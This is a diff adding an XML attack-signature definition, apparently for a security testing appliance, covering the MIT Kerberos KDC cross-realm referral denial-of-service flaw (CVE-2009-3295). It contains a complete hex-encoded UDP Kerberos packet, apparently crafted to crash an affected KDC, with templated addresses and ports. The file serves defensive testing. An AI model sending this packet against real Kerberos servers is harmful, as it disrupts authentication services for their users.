@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="MIT Kerberos KDC Cross Realm Referral Denial of Service"/>
+    <EngDesc display="true" value="A denial of service vulnerability exists in MIT's Kerberos. The vulnerability is due to a NULL pointer dereference in the KDC cross-realm referral processing implementation. A remote attacker can exploit this vulnerability by sending a crafted packet to an affected KDC, causing it to crash, creating a denial of service condition."/>
+    <Intent display="true">
+      <item value="Denial_of_Service/Memory_Corruption"/>
+    </Intent>
+    <Protocol display="true" value="Kerberos ASN.1"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="MIT"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="MIT_Kerberos"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="MIT_Kerberos_krb5-1.7"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-3295"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="53589e5921700116cffba9691d2fb970"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633984830086577640"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1262946606" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="sourcePort" type="ImperfectControls.Port" value="null" index="D"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="C"/>
+      <for index="F"/>
+      <for index="D"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:0C:29:79:34:78" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="02B6" Identification="BB36" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="$sourcePort" destPort="$destPort" checksum="" length="02A2" Payload="6C82029630820292A103020105A20302010CA382020A3082020630820202A103020101A28201F9048201F56E8201F1308201EDA003020105A10302010EA20703050000000000A382011A6182011630820112A003020105A10F1B0D5652542E54454C55532E434F4DA2223020A003020100A11930171B066B72627467741B0D5652542E54454C55532E434F4DA381D53081D2A003020112A103020101A281C50481C276C1C9A47AD6FEB18A931CBEBAE23E324BCF3D2A672972EC1975F42C6C40A79EC3901A29ADE91B0DAC8D664D75E503FF6E9DEEB81625AEA193E8ADB5CC1874C372E23F0837F37353E13E78FF3E972AF8D17FBE9F3BA004D95CD7CB43719234E2A404D63A1F5EC8102DE1C5D39C97727169592D603BCC20ED779F3BA1A61D06E18883EEC74701671CA39251F9BCD455385EAFC454BEF90499F654CE79273B6CC249ECEF9274B8650683F15ACD877F12B15E8A9A25E6D249206814A50365F9B0D4FF4EA481B93081B6A003020112A281AE0481ABF2451CE8E8323FF6B4D8A5037D00F60772FCD09AC9A668194F492AAD7C026C4880F36AF6F55CD2489450AE7B8FE1F97980EA30F7CE18FEBFF5CB61C96EB64A217D248A2B64B422F3D6446858298DB1500688A942EA16D4B658CF48FD665163EAFD715739B90E88872630B5D3E50E784FFA7AC6DA144DEE232902B788AC1F7120D7C1E0556059CAC31A3F4B53774E21F6B79B461717FF447FFCE4DE9BF0D6D87032CBA7B5D4269C364187AAA4783076A00703050040810000A20F1B0D5652542E54454C55532E434F4DA3263024A003020103A11D301B1B0673616D706C651B113137322E31362E382E3838002100000001A511180F32303130303130353136333535325AA70602044B422CD6A8173015020112020111020110020117020101020103020102"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
